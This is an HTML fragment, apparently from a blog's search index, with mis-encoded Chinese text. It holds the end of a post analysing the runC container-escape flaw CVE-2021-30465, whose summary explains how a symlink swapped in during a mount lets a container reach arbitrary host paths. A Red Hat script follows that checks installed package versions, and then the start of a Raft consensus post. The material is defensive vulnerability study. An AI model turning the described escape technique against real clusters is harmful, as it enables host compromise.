&lt;h3 id=&#34;æ€»ç»“&#34;&gt;æ€»ç»“&lt;/h3&gt;
&lt;p&gt;è¯¥æ¼æ´çš„å…³é”®ç‚¹åœ¨äºrunCåœ¨æŒ‚è½½æ•°æ®å·æ—¶å»checkæ–‡ä»¶æ—¶ä¸èƒ½ä¿è¯æ–‡ä»¶ä¸è¢«ç¬¦å·é“¾æ¥æ‰€æ›¿æ¢ï¼Œå¦‚æœè¢«æ¢æ‰é‚£ä¹ˆæŒ‚è½½çš„ç›®æ ‡æ–‡ä»¶å¯ä»¥æŒ‡å®šä¸ºå®¿ä¸»æœºä¸Šçš„ä»»æ„ä½ç½®ã€‚&lt;/p&gt;
&lt;p&gt;è¯¥POCçš„å…³é”®ç‚¹åœ¨äºï¼Œk8sæŒ‚è½½æ—¶ä¸èƒ½æŒ‡å®šæºï¼Œä½†å¯ä»¥å†³å®šç›®æ ‡ï¼Œé‚£ä¹ˆå°±å¯ä»¥åˆ›å»ºè®¾è®¡å¥½çš„ç¬¦å·é“¾æ¥ï¼Œä½œä¸ºåé¢å®¹å™¨æŒ‚è½½çš„æ–°æºï¼Œä»è€Œå®ç°é€ƒé€¸ã€‚&lt;/p&gt;
&lt;h3 id=&#34;æ¼æ´æ£€æµ‹è„šæœ¬&#34;&gt;æ¼æ´æ£€æµ‹è„šæœ¬&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#!/bin/bash

# Copyright (c) 2021  Red Hat, Inc.
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.

VERSION=&amp;quot;1.0&amp;quot;

# Warning! Be sure to download the latest version of this script from its primary source:

BULLETIN=&amp;quot;https://access.redhat.com/security/vulnerabilities/RHSB-2021-004&amp;quot;

# DO NOT blindly trust any internet sources and NEVER do `curl something | bash`!

# This script is meant for simple detection of the vulnerability. Feel free to modify it for your
# environment or needs. For more advanced detection, consider Red Hat Insights:
# https://access.redhat.com/products/red-hat-insights#getstarted

# Checking against the list of vulnerable packages is necessary because of the way how features
# are back-ported to older versions of packages in various channels.

VULNERABLE_VERSIONS=(
    &#39;runc-0.0.8-1.git4155b68.el7&#39;
    &#39;runc-0.1.0-3.el7&#39;
    &#39;runc-0.1.1-4.el7&#39;
    &#39;runc-0.1.1-5.el7&#39;
    &#39;runc-1.0.0-1.rc2.el7&#39;
    &#39;runc-1.0.0-3.rc2.el7&#39;
    &#39;runc-1.0.0-6.gite800860.el7&#39;
    &#39;runc-1.0.0-12.1.gitf8ce01d.el7&#39;
    &#39;runc-1.0.0-14.rc4dev.git84a082b.el7&#39;
    &#39;runc-1.0.0-21.rc4.dev.gitaea4f21.el7&#39;
    &#39;runc-1.0.0-23.rc4.dev.git1d3ab6d.el7&#39;
    &#39;runc-1.0.0-24.rc4.dev.gitc6e4a1e.el7&#39;
    &#39;runc-1.0.0-26.rc4.dev.git9f9c962.el7&#39;
    &#39;runc-1.0.0-27.rc5.dev.git4bb1fe4.el7&#39;
    &#39;runc-1.0.0-37.rc5.dev.gitad0f525.el7&#39;
    &#39;runc-1.0.0-52.dev.git70ca035.el7_5&#39;
    &#39;runc-1.0.0-54.dev.git2abd837.el7&#39;
    &#39;runc-1.0.0-57.dev.git2abd837.el7&#39;
    &#39;runc-1.0.0-59.dev.git2abd837.el7&#39;
    &#39;runc-1.0.0-64.rc8.el7&#39;
    &#39;runc-1.0.0-64.rc9.el7&#39;
    &#39;runc-1.0.0-65.rc8.el7&#39;
    &#39;runc-1.0.0-66.rc8.el7_7&#39;
    &#39;runc-1.0.0-66.rc10.rhaos4.3.el7_8&#39;
    &#39;runc-1.0.0-67.rc10.el7_8&#39;
    &#39;runc-1.0.0-67.rc10.rhaos4.2.el7_8&#39;
    &#39;runc-1.0.0-67.rc10.rhaos4.3.el7&#39;
    &#39;runc-1.0.0-68.rc10.el7_8&#39;
    &#39;runc-1.0.0-68.rc10.rhaos4.4.el7_8&#39;
    &#39;runc-1.0.0-69.rhaos4.4.git81f3917.el7&#39;
    &#39;runc-1.0.0-70.rhaos4.5.gite677e8b.el7&#39;
    &#39;runc-1.0.0-71.rhaos4.5.git5101761.el7&#39;
    &#39;runc-1.0.0-73.rhaos4.5.gitd2c3b70.el7&#39;
    &#39;runc-1.0.0-81.rhaos4.6.git5b757d4.el7&#39;
    &#39;runc-1.0.0-82.rhaos4.6.git086e841.el7&#39;
    &#39;runc-1.0.0-83.rhaos4.6.git8c2e7c8.el7&#39;
    &#39;runc-1.0.0-84.rhaos4.6.git7116f03.el7&#39;
    &#39;runc-1.0.0-85.rhaos4.6.git77a6f3c.el7&#39;
    &#39;runc-1.0.0-57.rc5.rhaos4.1.git2abd837.el8&#39;
    &#39;runc-1.0.0-60.rc8.rhaos4.1.git3cbe540.el8&#39;
    &#39;runc-1.0.0-61.rc8.rhaos4.1.git3cbe540.el8&#39;
    &#39;runc-1.0.0-61.rc8.rhaos4.2.git3cbe540.el8&#39;
    &#39;runc-1.0.0-62.rc8.rhaos4.1.git3cbe540.el8&#39;
    &#39;runc-1.0.0-63.rc8.el8&#39;
    &#39;runc-1.0.0-63.rc8.rhaos4.1.git3cbe540.el8_0&#39;
    &#39;runc-1.0.0-63.rc10.rhaos4.2.gitdc9208a.el8&#39;
    &#39;runc-1.0.0-64.rc9.el8&#39;
    &#39;runc-1.0.0-65.rc10.rhaos4.3.el8&#39;
    &#39;runc-1.0.0-65.rc10.rhaos4.4.el8&#39;
    &#39;runc-1.0.0-67.rc10.rhaos4.2.el8&#39;
    &#39;runc-1.0.0-67.rc10.rhaos4.3.el8&#39;
    &#39;runc-1.0.0-68.rc10.rhaos4.4.el8&#39;
    &#39;runc-1.0.0-69.rhaos4.4.git81f3917.el8&#39;
    &#39;runc-1.0.0-70.rhaos4.5.gite677e8b.el8&#39;
    &#39;runc-1.0.0-71.rhaos4.5.git5101761.el8&#39;
    &#39;runc-1.0.0-72.rhaos4.5.giteadfc6b.el8&#39;
    &#39;runc-1.0.0-73.rhaos4.5.gitd2c3b70.el8&#39;
    &#39;runc-1.0.0-81.rhaos4.6.git5b757d4.el8&#39;
    &#39;runc-1.0.0-82.rhaos4.6.git086e841.el8&#39;
    &#39;runc-1.0.0-83.rhaos4.6.git8c2e7c8.el8&#39;
    &#39;runc-1.0.0-84.rhaos4.6.git7116f03.el8&#39;
    &#39;runc-1.0.0-85.rhaos4.6.git77a6f3c.el8&#39;
    &#39;runc-1.0.0-54.rc5.dev.git2abd837.module+el8+2769+577ad176&#39;
    &#39;runc-1.0.0-55.rc5.dev.git2abd837.module+el8+2794+c81bb0a1&#39;
    &#39;runc-1.0.0-55.rc5.dev.git2abd837.module+el8.0.0+2956+30df4692&#39;
    &#39;runc-1.0.0-55.rc5.dev.git2abd837.module+el8.0.0+3049+59fd2bba&#39;
    &#39;runc-1.0.0-55.rc5.dev.git2abd837.module+el8.0.0+4014+8662b6b2&#39;
    &#39;runc-1.0.0-55.rc5.dev.git2abd837.module+el8.0.0.z+3525+56c076c3&#39;
    &#39;runc-1.0.0-55.rc5.dev.git2abd837.module+el8.1.0+3468+011f0ab0&#39;
    &#39;runc-1.0.0-56.rc5.dev.git2abd837.module+el8.1.0+4908+72a45cef&#39;
    &#39;runc-1.0.0-56.rc5.dev.git2abd837.module+el8.2.0+6370+6fb6c8ca&#39;
    &#39;runc-1.0.0-56.rc5.dev.git2abd837.module+el8.3.0+7197+26156b7d&#39;
    &#39;runc-1.0.0-56.rc5.dev.git2abd837.module+el8.3.0+8236+8e428216&#39;
    &#39;runc-1.0.0-56.rc5.dev.git2abd837.module+el8.3.0+10171+12421f43&#39;
    &#39;runc-1.0.0-56.rc8.dev.git425e105.module+el8.0.0+4017+bbba319f&#39;
    &#39;runc-1.0.0-60.rc8.module+el8.1.0+4081+b29780af&#39;
    &#39;runc-1.0.0-61.rc8.module+el8.1.0+4873+4a24e241&#39;
    &#39;runc-1.0.0-64.rc9.module+el8.1.1+5259+bcdd613a&#39;
    &#39;runc-1.0.0-64.rc10.module+el8.2.0+5728+ac3aae00&#39;
    &#39;runc-1.0.0-64.rc10.module+el8.2.0+6369+1f4293b4&#39;
    &#39;runc-1.0.0-64.rc10.module+el8.2.0+7659+b700d80e&#39;
    &#39;runc-1.0.0-64.rc10.module+el8.2.0+9347+d4fa9cbb&#39;
    &#39;runc-1.0.0-64.rc10.module+el8.2.0+9938+46853747&#39;
    &#39;runc-1.0.0-64.rc10.module+el8.3.0+7385+02cfa547&#39;
    &#39;runc-1.0.0-64.rc10.module+el8.3.0+7660+b7198318&#39;
    &#39;runc-1.0.0-64.rc10.module+el8.3.0+7842+fbbcd85c&#39;
    &#39;runc-1.0.0-64.rc10.module+el8.3.0+8233+627fbb78&#39;
    &#39;runc-1.0.0-64.rc10.module+el8.3.0+8377+eff33c85&#39;
    &#39;runc-1.0.0-64.rc10.module+el8.3.0+9348+d780f094&#39;
    &#39;runc-1.0.0-64.rc10.module+el8.3.0+10188+4c10031c&#39;
    &#39;runc-1.0.0-64.rc10.module+el8.4.0+9935+d4945f3f&#39;
    &#39;runc-1.0.0-64.rc10.module+el8.4.0+10193+e90fd8eb&#39;
    &#39;runc-1.0.0-65.rc10.module+el8.2.0+5762+aaee29fb&#39;
    &#39;runc-1.0.0-65.rc10.module+el8.2.0+6368+cf16aa14&#39;
    &#39;runc-1.0.0-66.rc10.module+el8.2.1+6465+1a51e8b6&#39;
    &#39;runc-1.0.0-66.rc10.module+el8.3.0+7084+c16098dd&#39;
    &#39;runc-1.0.0-68.rc92.module+el8.3.0+7635+9a181104&#39;
    &#39;runc-1.0.0-68.rc92.module+el8.3.0+7716+ce654703&#39;
    &#39;runc-1.0.0-68.rc92.module+el8.3.0+7843+7fef9496&#39;
    &#39;runc-1.0.0-68.rc92.module+el8.3.0+8221+97165c3f&#39;
    &#39;runc-1.0.0-70.rc92.module+el8.3.1+9857+68fb1526&#39;
    &#39;runc-1.0.0-70.rc92.module+el8.4.0+10197+7c295612&#39;
    &#39;runc-1.0.0-70.rc92.module+el8.4.0+10198+36d1d0e3&#39;
    &#39;runc-1.0.0-70.rc92.module+el8.4.0+10607+f4da7515&#39;
    &#39;runc-1.0.0-70.rc92.module+el8.4.0+10614+dd38312c&#39;
    &#39;docker-0.10.0-9.el7&#39;
    &#39;docker-0.11.1-19.el7&#39;
    &#39;docker-0.11.1-22.el7&#39;
    &#39;docker-1.1.2-9.el7&#39;
    &#39;docker-1.1.2-13.el7&#39;
    &#39;docker-1.2.0-1.8.el7&#39;
    &#39;docker-1.3.2-4.el7&#39;
    &#39;docker-1.4.1-37.el7&#39;
    &#39;docker-1.5.0-27.el7&#39;
    &#39;docker-1.5.0-28.el7&#39;
    &#39;docker-1.6.0-11.el7&#39;
    &#39;docker-1.6.2-8.el7&#39;
    &#39;docker-1.6.2-14.el7&#39;
    &#39;docker-1.7.1-108.el7&#39;
    &#39;docker-1.7.1-115.el7&#39;
    &#39;docker-1.8.2-7.el7&#39;
    &#39;docker-1.8.2-8.el7&#39;
    &#39;docker-1.8.2-10.el7&#39;
    &#39;docker-1.9.1-25.el7&#39;
    &#39;docker-1.9.1-40.el7&#39;
    &#39;docker-1.10.3-44.el7&#39;
    &#39;docker-1.10.3-46.el7.10&#39;
    &#39;docker-1.10.3-46.el7.14&#39;
    &#39;docker-1.10.3-57.el7&#39;
    &#39;docker-1.10.3-59.el7&#39;
    &#39;docker-1.12.5-14.el7&#39;
    &#39;docker-1.12.6-11.el7&#39;
    &#39;docker-1.12.6-16.el7&#39;
    &#39;docker-1.12.6-28.git1398f24.el7&#39;
    &#39;docker-1.12.6-32.git88a4867.el7&#39;
    &#39;docker-1.12.6-48.git0fdc778.el7&#39;
    &#39;docker-1.12.6-55.gitc4618fb.el7&#39;
    &#39;docker-1.12.6-61.git85d7426.el7&#39;
    &#39;docker-1.12.6-68.gitec8512b.el7&#39;
    &#39;docker-1.12.6-71.git3e8e77d.el7&#39;
    &#39;docker-1.12.6-79.git5680db5.el7&#39;
    &#39;docker-1.13.1-53.git774336d.el7&#39;
    &#39;docker-1.13.1-58.git87f2fab.el7&#39;
    &#39;docker-1.13.1-63.git94f4240.el7&#39;
    &#39;docker-1.13.1-68.gitdded712.el7&#39;
    &#39;docker-1.13.1-74.git6e3bb8e.el7&#39;
    &#39;docker-1.13.1-75.git8633870.el7_5&#39;
    &#39;docker-1.13.1-84.git07f3374.el7&#39;
    &#39;docker-1.13.1-88.git07f3374.el7&#39;
    &#39;docker-1.13.1-90.git07f3374.el7&#39;
    &#39;docker-1.13.1-91.git07f3374.el7&#39;
    &#39;docker-1.13.1-94.gitb2f74b2.el7&#39;
    &#39;docker-1.13.1-96.gitb2f74b2.el7&#39;
    &#39;docker-1.13.1-102.git7f2769b.el7&#39;
    &#39;docker-1.13.1-103.git7f2769b.el7&#39;
    &#39;docker-1.13.1-104.git4ef4b30.el7&#39;
    &#39;docker-1.13.1-108.git4ef4b30.el7&#39;
    &#39;docker-1.13.1-109.gitcccb291.el7_7&#39;
    &#39;docker-1.13.1-161.git64e9980.el7_8&#39;
    &#39;docker-1.13.1-162.git64e9980.el7_8&#39;
    &#39;docker-1.13.1-203.git0be3e21.el7_9&#39;
    &#39;docker-1.13.1-204.git0be3e21.el7_9&#39;
    &#39;docker-1.13.1-205.git7d71120.el7_9&#39;
    &#39;docker-latest-1.10.3-22.el7&#39;
    &#39;docker-latest-1.10.3-44.el7&#39;
    &#39;docker-latest-1.10.3-46.el7.10&#39;
    &#39;docker-latest-1.12.1-2.el7&#39;
    &#39;docker-latest-1.12.1-3.el7&#39;
    &#39;docker-latest-1.12.3-10.el7&#39;
    &#39;docker-latest-1.12.5-14.el7&#39;
    &#39;docker-latest-1.12.6-11.el7&#39;
    &#39;docker-latest-1.13.1-4.el7&#39;
    &#39;docker-latest-1.13.1-11.git3a17ad5.el7&#39;
    &#39;docker-latest-1.13.1-13.gitb303bf6.el7&#39;
    &#39;docker-latest-1.13.1-21.1.gitcd75c68.el7&#39;
    &#39;docker-latest-1.13.1-23.git28ae36d.el7&#39;
    &#39;docker-latest-1.13.1-26.git1faa135.el7&#39;
    &#39;docker-latest-1.13.1-36.git9a813fa.el7&#39;
    &#39;docker-latest-1.13.1-37.git9a813fa.el7&#39;
    &#39;docker-latest-1.13.1-53.git774336d.el7&#39;
    &#39;docker-latest-1.13.1-58.git87f2fab.el7&#39;
)

basic_args() {
    # Parses basic commandline arguments and sets basic environment.
    #
    # Args:
    #     parameters - an array of commandline arguments
    #
    # Side effects:
    #     Exits if --help parameters is used
    #     Sets COLOR constants and debug variable

    local parameters=( &amp;quot;$@&amp;quot; )

    RED=&amp;quot;\\033[1;31m&amp;quot;
    GREEN=&amp;quot;\\033[1;32m&amp;quot;
    BOLD=&amp;quot;\\033[1m&amp;quot;
    RESET=&amp;quot;\\033[0m&amp;quot;
    for parameter in &amp;quot;${parameters[@]}&amp;quot;; do
        if [[ &amp;quot;$parameter&amp;quot; == &amp;quot;-h&amp;quot; || &amp;quot;$parameter&amp;quot; == &amp;quot;--help&amp;quot; ]]; then
            echo &amp;quot;Usage: $( basename &amp;quot;$0&amp;quot; ) [-n | --no-colors] [-d | --debug]&amp;quot;
            exit 1
        elif [[ &amp;quot;$parameter&amp;quot; == &amp;quot;-n&amp;quot; || &amp;quot;$parameter&amp;quot; == &amp;quot;--no-colors&amp;quot; ]]; then
            RED=&amp;quot;&amp;quot;
            GREEN=&amp;quot;&amp;quot;
            BOLD=&amp;quot;&amp;quot;
            RESET=&amp;quot;&amp;quot;
        elif [[ &amp;quot;$parameter&amp;quot; == &amp;quot;-d&amp;quot; || &amp;quot;$parameter&amp;quot; == &amp;quot;--debug&amp;quot; ]]; then
            debug=true
        fi
    done
}


basic_reqs() {
    # Prints common disclaimer and checks basic requirements.
    #
    # Args:
    #     CVE - string printed in the disclaimer
    #
    # Side effects:
    #     Exits when &#39;rpm&#39; command is not available

    local CVE=&amp;quot;$1&amp;quot;

    # Disclaimer
    echo
    echo -e &amp;quot;${BOLD}This script (v$VERSION) is primarily designed to detect $CVE on supported&amp;quot;
    echo -e &amp;quot;Red Hat Enterprise Linux systems and kernel packages.&amp;quot;
    echo -e &amp;quot;Result may be inaccurate for other RPM based systems.&amp;quot;
    echo -e &amp;quot;Result may be inaccurate for affected RPM packages not compiled by Red Hat.${RESET}&amp;quot;
    echo

    # RPM is required
    if ! command -v rpm &amp;amp;&amp;gt; /dev/null; then
        echo &amp;quot;&#39;rpm&#39; command is required, but not installed. Exiting.&amp;quot;
        exit 1
    fi
}


check_supported_kernel() {
    # Checks if running kernel is supported.
    #
    # Args:
    #     running_kernel - kernel string as returned by &#39;uname -r&#39;
    #
    # Side effects:
    #     Exits when running kernel is obviously not supported

    local running_kernel=&amp;quot;$1&amp;quot;

    # Check supported platform
    if [[ &amp;quot;$running_kernel&amp;quot; != *&amp;quot;.el&amp;quot;[7-8]* ]]; then
        echo -e &amp;quot;${RED}This script is meant to be used only on RHEL 7 and 8.${RESET}&amp;quot;
        echo
        echo -e &amp;quot;Follow $BULLETIN for advice.&amp;quot;
        exit 1
    fi
}


check_package() {
    # Checks if installed package is in list of vulnerable packages.
    #
    # Args:
    #     installed_packages - installed packages string as returned by &#39;rpm -qa package&#39;
    #                          (may be multiline)
    #     vulnerable_versions - an array of vulnerable versions
    #
    # Prints:
    #     First vulnerable package string as returned by &#39;rpm -qa package&#39;, or nothing

    # Convert to array, use word splitting on purpose
    # shellcheck disable=SC2206
    local installed_packages=( $1 )
    shift
    local vulnerable_versions=( &amp;quot;$@&amp;quot; )

    for tested_package in &amp;quot;${vulnerable_versions[@]}&amp;quot;; do
        for installed_package in &amp;quot;${installed_packages[@]}&amp;quot;; do
            installed_package_without_arch=&amp;quot;${installed_package%.*}&amp;quot;
            if [[ &amp;quot;$installed_package_without_arch&amp;quot; == &amp;quot;$tested_package&amp;quot; ]]; then
                echo &amp;quot;$installed_package&amp;quot;
                return 0
            fi
        done
    done
}


get_installed_packages() {
    # Checks for installed packages. Compatible with RHEL5.
    #
    # Args:
    #     package_names - an array of package name strings
    #
    # Prints:
    #     Lines with N-V-R.A strings of the installed packages.

    local package_names=( &amp;quot;$@&amp;quot; )

    rpm -qa --queryformat=&amp;quot;%{NAME}-%{VERSION}-%{RELEASE}.%{ARCH}\n&amp;quot; &amp;quot;${package_names[@]}&amp;quot;
}


get_installed_package_names() {
    # Checks for installed packages and returns the names of the installed packages. Compatible with RHEL5.
    #
    # Args:
    #     package_names - an array of package name strings
    #
    # Prints:
    #     Lines with the names of the installed packages.

    local package_names=( &amp;quot;$@&amp;quot; )

    rpm -qa --queryformat=&amp;quot;%{NAME}\n&amp;quot; &amp;quot;${package_names[@]}&amp;quot; | uniq
}


parse_facts() {
    # Gathers all available information and stores it in global variables. Only store facts and
    # do not draw conclusion in this function for better maintainability.
    #
    # Side effects:
    #     Sets many global boolean flags and content variables

    installed_runc=$( get_installed_packages &amp;quot;runc&amp;quot; )
    installed_docker=$( get_installed_packages &amp;quot;docker&amp;quot; )
    installed_docker_latest=$( get_installed_packages &amp;quot;docker-latest&amp;quot; )

}

draw_conclusions() {
    # Draws conclusions based on available system data.
    #
    # Side effects:
    #     Sets many global boolean flags and content variables

    vulnerable_runc=$( check_package &amp;quot;$installed_runc&amp;quot; &amp;quot;${VULNERABLE_VERSIONS[@]}&amp;quot; )
    vulnerable_docker=$( check_package &amp;quot;$installed_docker&amp;quot; &amp;quot;${VULNERABLE_VERSIONS[@]}&amp;quot; )
    vulnerable_docker_latest=$( check_package &amp;quot;$installed_docker_latest&amp;quot; &amp;quot;${VULNERABLE_VERSIONS[@]}&amp;quot; )

    result=0
    if [[ &amp;quot;$vulnerable_runc&amp;quot; ]]; then
        (( result |= 2 ))
    fi
    if [[ &amp;quot;$vulnerable_docker&amp;quot; ]]; then
        (( result |= 4 ))
    fi
    if [[ &amp;quot;$vulnerable_docker_latest&amp;quot; ]]; then
        (( result |= 8 ))
    fi
}


debug_print() {
    # Prints selected variables when debugging is enabled.

    variables=( installed_runc installed_docker installed_docker_latest
                vulnerable_runc vulnerable_docker vulnerable_docker_latest
                running_kernel rhel result )
    for variable in &amp;quot;${variables[@]}&amp;quot;; do
        echo &amp;quot;$variable = *${!variable}*&amp;quot;
    done
    echo
}



if [[ &amp;quot;${BASH_SOURCE[0]}&amp;quot; == &amp;quot;$0&amp;quot; ]]; then
    basic_args &amp;quot;$@&amp;quot;
    basic_reqs &amp;quot;CVE-2021-30465&amp;quot;
    running_kernel=$( uname -r )
    check_supported_kernel &amp;quot;$running_kernel&amp;quot;

    parse_facts
    draw_conclusions

    # Debug prints
    if [[ &amp;quot;$debug&amp;quot; ]]; then
        debug_print
    fi

    sentence_end=&amp;quot;.&amp;quot;
    if [[ &amp;quot;$installed_runc&amp;quot; || &amp;quot;$installed_docker&amp;quot; || &amp;quot;$installed_docker_latest&amp;quot; ]]; then
        echo &amp;quot;Detected packages:&amp;quot;
        sentence_end=&amp;quot;:&amp;quot;
    fi
    if [[ &amp;quot;$installed_runc&amp;quot; ]]; then
        echo -e &amp;quot;* Detected &#39;runc&#39; package: ${BOLD}$installed_runc${RESET}&amp;quot;
    else
        echo &amp;quot;* Package &#39;runc&#39; not installed.&amp;quot;
    fi
    if [[ &amp;quot;$installed_docker&amp;quot; ]]; then
        echo -e &amp;quot;* Detected &#39;docker&#39; package: ${BOLD}$installed_docker${RESET}&amp;quot;
    else
        echo &amp;quot;* Package &#39;docker&#39; not installed.&amp;quot;
    fi
    if [[ &amp;quot;$installed_docker_latest&amp;quot; ]]; then
        echo -e &amp;quot;* Detected &#39;docker-latest&#39; package: ${BOLD}$installed_docker_latest${RESET}&amp;quot;
    else
        echo &amp;quot;* Package &#39;docker-latest&#39; not installed.&amp;quot;
    fi

    echo
    if (( result )); then
        echo -e &amp;quot;${RED}This system is vulnerable:${RESET}&amp;quot;
    else
        echo -e &amp;quot;${GREEN}This system is not vulnerable${sentence_end}${RESET}&amp;quot;
    fi

    if [[ &amp;quot;$installed_runc&amp;quot; ]]; then
        if [[ &amp;quot;$vulnerable_runc&amp;quot; ]]; then
            echo -e &amp;quot;* &#39;runc&#39; package is ${RED}vulnerable${RESET}&amp;quot;
        else
            echo -e &amp;quot;* &#39;runc&#39; package is ${GREEN}NOT vulnerable${RESET}&amp;quot;
        fi
    fi

    if [[ &amp;quot;$installed_docker&amp;quot; ]]; then
        if [[ &amp;quot;$vulnerable_docker&amp;quot; ]]; then
            echo -e &amp;quot;* &#39;docker&#39; package is ${RED}vulnerable${RESET}&amp;quot;
        else
            echo -e &amp;quot;* &#39;docker&#39; package is ${GREEN}NOT vulnerable${RESET}&amp;quot;
        fi
    fi

    if [[ &amp;quot;$installed_docker_latest&amp;quot; ]]; then
        if [[ &amp;quot;$vulnerable_docker_latest&amp;quot; ]]; then
            echo -e &amp;quot;* &#39;docker-latest&#39; package is ${RED}vulnerable${RESET}&amp;quot;
        else
            echo -e &amp;quot;* &#39;docker-latest&#39; package is ${GREEN}NOT vulnerable${RESET}&amp;quot;
        fi
    fi

    if [[ ! &amp;quot;$vulnerable_runc&amp;quot; &amp;amp;&amp;amp; ! &amp;quot;$vulnerable_docker&amp;quot; &amp;amp;&amp;amp; ! &amp;quot;$vulnerable_docker_latest&amp;quot; ]]; then
        echo
        echo -e &amp;quot;There are ${GREEN}NO vulnerable packages${RESET} installed.&amp;quot;
    fi

    echo
    echo -e &amp;quot;Follow $BULLETIN for advice.&amp;quot;

    exit &amp;quot;$result&amp;quot;
fi

&lt;/code&gt;&lt;/pre&gt;
">ã€å®¹å™¨ã€‘CVE-2021-30465 runCé€ƒé€¸æ¼æ´åˆ†æå¤ç°</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/raft-yi-zhi-xing-gong-shi-suan-fa/"" data-c="
          &lt;p&gt;åˆ†å¸ƒå¼å­˜å‚¨ç³»ç»Ÿé€šå¸¸é€šè¿‡ç»´æŠ¤å¤šä¸ªå‰¯æœ¬æ¥è¿›è¡Œå®¹é”™ï¼Œæé«˜ç³»ç»Ÿçš„å¯ç”¨æ€§ã€‚è¦å®ç°æ­¤ç›®æ ‡ï¼Œå°±å¿…é¡»è¦è§£å†³åˆ†å¸ƒå¼å­˜å‚¨ç³»ç»Ÿçš„æœ€æ ¸å¿ƒé—®é¢˜ï¼šç»´æŠ¤å¤šä¸ªå‰¯æœ¬çš„ä¸€è‡´æ€§ã€‚&lt;/p&gt;
&lt;p&gt;é¦–å…ˆéœ€è¦è§£é‡Šä¸€ä¸‹ä»€ä¹ˆæ˜¯ä¸€è‡´æ€§ï¼ˆconsensusï¼‰,å®ƒæ˜¯æ„å»ºå…·æœ‰å®¹é”™æ€§ï¼ˆfault-tolerantï¼‰çš„åˆ†å¸ƒå¼ç³»ç»Ÿçš„åŸºç¡€ã€‚ åœ¨ä¸€ä¸ªå…·æœ‰ä¸€è‡´æ€§çš„æ€§è´¨çš„é›†ç¾¤é‡Œé¢ï¼ŒåŒä¸€æ—¶åˆ»æ‰€æœ‰çš„ç»“ç‚¹å¯¹å­˜å‚¨åœ¨å…¶ä¸­çš„æŸä¸ªå€¼éƒ½æœ‰ç›¸åŒçš„ç»“æœï¼Œå³å¯¹å…¶å…±äº«çš„å­˜å‚¨ä¿æŒä¸€è‡´ã€‚é›†ç¾¤å…·æœ‰è‡ªåŠ¨æ¢å¤çš„æ€§è´¨ï¼Œå½“å°‘æ•°ç»“ç‚¹å¤±æ•ˆçš„æ—¶å€™ä¸å½±å“é›†ç¾¤çš„æ­£å¸¸å·¥ä½œï¼Œå½“å¤§å¤šæ•°é›†ç¾¤ä¸­çš„ç»“ç‚¹å¤±æ•ˆçš„æ—¶å€™ï¼Œé›†ç¾¤åˆ™ä¼šåœæ­¢æœåŠ¡ï¼ˆä¸ä¼šè¿”å›ä¸€ä¸ªé”™è¯¯çš„ç»“æœï¼‰ã€‚&lt;/p&gt;
&lt;p&gt;ä¸€è‡´æ€§åè®®å°±æ˜¯ç”¨æ¥å¹²è¿™äº‹çš„ï¼Œç”¨æ¥ä¿è¯å³ä½¿åœ¨éƒ¨åˆ†(ç¡®åˆ‡åœ°è¯´æ˜¯å°éƒ¨åˆ†)å‰¯æœ¬å®•æœºçš„æƒ…å†µä¸‹ï¼Œç³»ç»Ÿä»ç„¶èƒ½æ­£å¸¸å¯¹å¤–æä¾›æœåŠ¡ã€‚ä¸€è‡´æ€§åè®®é€šå¸¸åŸºäºreplicated state machinesï¼Œå³æ‰€æœ‰ç»“ç‚¹éƒ½ä»åŒä¸€ä¸ªstateå‡ºå‘ï¼Œéƒ½ç»è¿‡åŒæ ·çš„ä¸€äº›æ“ä½œåºåˆ—ï¼ˆlogï¼‰ï¼Œæœ€ååˆ°è¾¾åŒæ ·çš„stateã€‚&lt;/p&gt;
&lt;h2 id=&#34;æ¶æ„&#34;&gt;æ¶æ„&lt;/h2&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://pic2.zhimg.com/v2-e747e997d58aee9252b187c8434a1cc1_b.jpg&#34; alt=&#34;img&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;ç³»ç»Ÿä¸­æ¯ä¸ªç»“ç‚¹æœ‰ä¸‰ä¸ªç»„ä»¶ï¼š&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;https://www.zhihu.com/search?q=%E7%8A%B6%E6%80%81%E6%9C%BA&amp;amp;search_source=Entity&amp;amp;hybrid_search_source=Entity&amp;amp;hybrid_search_extra=%7B%22sourceType%22%3A%22article%22%2C%22sourceId%22%3A%2227207160%22%7D&#34;&gt;çŠ¶æ€æœº&lt;/a&gt;: å½“æˆ‘ä»¬è¯´ä¸€è‡´æ€§çš„æ—¶å€™ï¼Œå®é™…å°±æ˜¯åœ¨è¯´è¦ä¿è¯è¿™ä¸ªçŠ¶æ€æœºçš„ä¸€è‡´æ€§ã€‚çŠ¶æ€æœºä¼šä»logé‡Œé¢å–å‡ºæ‰€æœ‰çš„å‘½ä»¤ï¼Œç„¶åæ‰§è¡Œä¸€éï¼Œå¾—åˆ°çš„ç»“æœå°±æ˜¯æˆ‘ä»¬å¯¹å¤–æä¾›çš„ä¿è¯äº†ä¸€è‡´æ€§çš„æ•°æ®&lt;br&gt;
Log: ä¿å­˜äº†æ‰€æœ‰ä¿®æ”¹è®°å½•&lt;br&gt;
ä¸€è‡´æ€§æ¨¡å—: ä¸€è‡´æ€§æ¨¡å—ç®—æ³•å°±æ˜¯ç”¨æ¥ä¿è¯å†™å…¥çš„logçš„å‘½ä»¤çš„ä¸€è‡´æ€§ï¼Œè¿™ä¹Ÿæ˜¯raftç®—æ³•æ ¸å¿ƒå†…å®¹&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;åè®®å†…å®¹&lt;/p&gt;
&lt;p&gt;Raftåè®®å°†ä¸€è‡´æ€§åè®®çš„æ ¸å¿ƒå†…å®¹åˆ†æ‹†æˆä¸ºå‡ ä¸ªå…³é”®é˜¶æ®µï¼Œä»¥ç®€åŒ–æµç¨‹ï¼Œæé«˜åè®®çš„å¯ç†è§£æ€§ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Leader election&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Raftåè®®çš„æ¯ä¸ªå‰¯æœ¬éƒ½ä¼šå¤„äºä¸‰ç§çŠ¶æ€ä¹‹ä¸€ï¼šLeaderã€Followerã€Candidateã€‚&lt;/p&gt;
&lt;blockquote&gt;
